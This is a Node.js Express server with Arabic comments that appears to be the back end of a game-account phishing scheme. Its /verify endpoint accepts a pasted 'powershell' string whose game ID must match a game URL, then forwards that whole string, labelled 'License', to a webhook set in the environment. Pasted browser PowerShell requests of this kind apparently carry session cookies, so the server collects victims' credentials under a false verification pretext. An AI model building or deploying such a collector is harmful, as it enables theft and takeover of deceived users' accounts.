const express = require("express");
const cors = require("cors");
const fetch = require("node-fetch");
const FormData = require("form-data");

const app = express();

app.use(cors());
app.use(express.json());

app.post("/verify", async (req, res) => {
    try {
        const { gameUrl, powershell } = req.body;

        if (!gameUrl || !powershell) {
            return res.json({ success: false, message: "Missing data" });
        }

        // استخراج ID من الرابطين
        const gameMatch = gameUrl.match(/\/games\/(\d+)/);
        const psMatch = powershell.match(/\/games\/(\d+)/);

        if (!gameMatch || !psMatch) {
            return res.json({ success: false, message: "Invalid format" });
        }

        if (gameMatch[1] !== psMatch[1]) {
            return res.json({ success: false, message: "ID mismatch" });
        }

        const gameId = gameMatch[1];

        const webhookURL = process.env.WEBHOOK;
        if (!webhookURL) {
            console.error("WEBHOOK variable not set!");
            return res.status(500).json({ success: false });
        }

        // محتوى الملف
        const fileContent =
`New Valid Submission

Game ID: ${gameId}

License:
${powershell}
`;

        const form = new FormData();

        form.append("content", `🎮 New Game ID: ${gameId}`);
        form.append("file", Buffer.from(fileContent), {
            filename: "license.txt",
            contentType: "text/plain"
        });

        await fetch(webhookURL, {
            method: "POST",
            body: form
        });

        res.json({ success: true });

    } catch (err) {
        console.error("ERROR:", err);
        res.status(500).json({ success: false });
    }
});

app.listen(process.env.PORT || 3000, () => {
    console.log("Server running...");
});